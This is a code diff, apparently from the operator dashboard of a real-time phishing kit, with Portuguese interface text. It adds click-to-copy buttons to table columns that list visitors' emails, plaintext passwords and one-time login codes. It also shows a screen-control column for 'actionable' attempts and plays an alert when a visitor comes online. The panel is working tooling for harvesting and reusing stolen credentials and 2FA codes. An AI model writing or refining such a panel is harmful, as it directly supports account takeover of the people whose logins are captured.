@@ -91,6 +91,31 @@ function deviceLabel(ua: string | null): string {
   return "Web";
 }
 
+/** Célula que copia o conteúdo pro clipboard ao clicar. */
+function CopyText({ value, className = "", emptyValue }: { value: string; className?: string; emptyValue?: string }) {
+  if (!value || value === "—") {
+    return <span className="text-muted-foreground">{emptyValue ?? "—"}</span>;
+  }
+  const handleCopy = async () => {
+    try {
+      await navigator.clipboard.writeText(value);
+      toast.success("Copiado!", { description: value, duration: 1500 });
+    } catch {
+      toast.error("Falha ao copiar");
+    }
+  };
+  return (
+    <button
+      type="button"
+      onClick={handleCopy}
+      title="Clique pra copiar"
+      className={`cursor-pointer rounded px-1 py-0.5 text-left transition-colors hover:bg-primary/10 hover:text-primary active:bg-primary/20 ${className}`}
+    >
+      {value}
+    </button>
+  );
+}
+
 /** Som de entrada de visitante (transição offline→online). */
 function playOnlineDing() {
   try {
@@ -496,9 +521,11 @@ export default function Dashboard() {
                         <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                           {formatTime(s.lastActivity)}
                         </td>
-                        <td className="break-all px-4 py-3 font-mono text-xs">{s.email}</td>
                         <td className="break-all px-4 py-3 font-mono text-xs">
-                          {hasPassword ? s.password : <span className="text-muted-foreground">—</span>}
+                          <CopyText value={s.email} />
+                        </td>
+                        <td className="break-all px-4 py-3 font-mono text-xs">
+                          <CopyText value={hasPassword ? s.password : ""} />
                         </td>
                         <td className="whitespace-nowrap px-4 py-3 text-xs">
                           <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
@@ -676,11 +703,13 @@ function AttemptsTable({
                 <Hash className="h-3 w-3" /> Código
               </span>
             </th>
-            <th className="px-4 py-3 text-left font-medium">
-              <span className="inline-flex items-center gap-1">
-                <Monitor className="h-3 w-3" /> Tela
-              </span>
-            </th>
+            {actionable && (
+              <th className="px-4 py-3 text-left font-medium">
+                <span className="inline-flex items-center gap-1">
+                  <Monitor className="h-3 w-3" /> Tela
+                </span>
+              </th>
+            )}
             <th className="px-4 py-3 text-left font-medium">Dispositivo</th>
           </tr>
         </thead>
@@ -705,14 +734,22 @@ function AttemptsTable({
                 <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                   {formatTime(row.codeAt)}
                 </td>
-                <td className="break-all px-4 py-3 font-mono text-xs">{row.email}</td>
-                <td className="break-all px-4 py-3 font-mono text-xs">{row.password}</td>
-                <td className="px-4 py-3 font-mono text-sm tracking-widest">{row.code}</td>
-                <td className="whitespace-nowrap px-4 py-3 text-xs">
-                  <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
-                    {screenLabel}
-                  </span>
+                <td className="break-all px-4 py-3 font-mono text-xs">
+                  <CopyText value={row.email} />
                 </td>
+                <td className="break-all px-4 py-3 font-mono text-xs">
+                  <CopyText value={row.password} />
+                </td>
+                <td className="px-4 py-3 font-mono text-sm tracking-widest">
+                  <CopyText value={row.code} className="tracking-widest" />
+                </td>
+                {actionable && (
+                  <td className="whitespace-nowrap px-4 py-3 text-xs">
+                    <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
+                      {screenLabel}
+                    </span>
+                  </td>
+                )}
                 <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">{deviceLabel(ua)}</td>
               </tr>
               {actionable && (
